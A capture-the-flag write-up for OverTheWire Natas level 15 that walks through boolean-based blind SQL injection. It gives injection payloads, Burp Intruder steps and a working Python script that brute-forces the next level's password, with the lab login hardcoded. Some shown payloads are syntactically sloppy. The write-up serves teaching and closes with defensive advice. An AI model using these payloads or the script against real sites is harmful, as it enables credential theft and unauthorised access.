## Overview

This level demonstrates a **boolean-based blind SQL injection**, where the application does not return query results directly.
Instead, it reveals limited information through conditional responses such as:  
- **This user exists**
- **This user doesn’t exist**

This forces us to extract data indirectly by observing differences in server responses.

## Vulnerability Analysis

From the application behavior and source code hints, we can infer:

- there is a `users` table  
- it contains at least `username` and `password`  
- the application checks whether a user exists based on a query  

Because no actual data is returned, the attack relies on **true/false conditions**.

## Exploitation Strategy

### Step 1: Confirm Injection Point

We inject into the username field with a payload like:

```
natas16" AND 1=1 -- 
```

and compare it with:

```
natas16" AND 1=2 -- 
```

If responses differ, we confirm a boolean-based SQL injection.

---

### Step 2: Extract Password Character-by-Character

We use the `SUBSTRING()` function to isolate individual characters:

```
natas16" AND SUBSTRING(SELECT password FROM users WHERE username="natas16", 1, 1) = "a" -- 
```

We iterate over:  
- character positions (1 → 32 assuming this password as many characters as the previous ones)  
- possible characters (a–z, A–Z, 0–9)

---

### Step 3: Resolve Case Ambiguity with ASCII

A key issue encountered was that both lowercase and uppercase letters sometimes produced identical responses.

To eliminate ambiguity, we switch to ASCII comparison:

```
natas16" AND ASCII(SUBSTRING(SELECT password FROM users WHERE username="natas16", 1, 1)) = 97 -- 
```

Since ASCII values are unique, this guarantees accurate identification of each character.

---

## Manual Testing with Burp Suite

Using **Burp Suite Intruder**, we:

1. Target a single character position
2. Iterate through a payload list of ASCII values
3. Observe response differences
4. Identify the correct character

This validates the logic before automation.

---

## Automation with Python

Once the logic is confirmed, the process can be automated.

Below is a simple Python script demonstrating the concept:

```python
import requests
import string

url = "http://natas15.natas.labs.overthewire.org/"
auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")

charset = string.ascii_letters + string.digits
password = ""

for i in range(1, 33):  # assuming 32-character password
    for char in charset:
        payload = f'natas16" AND SUBSTRING(password,{i},1)="{char}" -- '
        response = requests.post(url, data={"username": payload}, auth=auth)

        if "This user exists" in response.text:
            password += char
            print(f"[+] Found character {i}: {char}")
            break

print(f"\n[+] Password: {password}")
```

### Notes:  
- this script performs a brute-force extraction using boolean responses
- can be optimized further using ASCII ranges instead of full charset

---

## Key Takeaways

* **Blind SQL injection** relies on indirect information leakage
* `SUBSTRING()` allows isolating individual characters
* `ASCII()` is useful for resolving ambiguity
* Manual testing helps validate logic before automation
* Automation significantly improves efficiency for repetitive tasks

---

## Final Thoughts

This level highlights the importance of:

* Proper input sanitization
* Use of prepared statements
* Avoiding direct query concatenation

Even without visible output, improperly handled queries can still leak sensitive data through subtle behavioral differences.
